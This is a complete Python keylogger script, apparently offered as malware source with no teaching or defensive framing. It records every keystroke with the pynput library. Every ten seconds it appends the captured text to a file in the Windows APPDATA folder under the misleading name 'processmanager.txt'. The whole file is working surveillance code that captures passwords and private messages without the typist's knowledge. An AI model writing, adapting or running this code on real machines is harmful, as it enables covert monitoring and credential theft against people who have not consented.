#!/usr/bin/env python
# -*- coding: utf-8 -*-
import pynput.keyboard
import threading
import os

keys = ""
path = os.environ["appdata"] + "\\processmanager.txt"

def process_keys(key):
    """Process and store keystrokes"""
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys = keys + " "
        elif key == key.enter:
            keys = keys + "\n"
        elif key == key.right:
            keys = keys + " [RIGHT] "
        elif key == key.left:
            keys = keys + " [LEFT] "
        elif key == key.up:
            keys = keys + " [UP] "
        elif key == key.down:
            keys = keys + " [DOWN] "
        else:
            keys = keys + " " + str(key) + " "

def report():
    """Write logged keys to file every 10 seconds"""
    global keys
    global path
    if keys:
        try:
            fin = open(path, "a")
            fin.write(keys)
            fin.close()
            keys = ""
        except Exception as e:
            print("Error writing to keylog file: " + str(e))
    timer = threading.Timer(10, report)
    timer.daemon = True
    timer.start()

def start():
    """Start the keylogger"""
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    keyboard_listener.start()
    report()
    # Keep the listener running
    keyboard_listener.join()
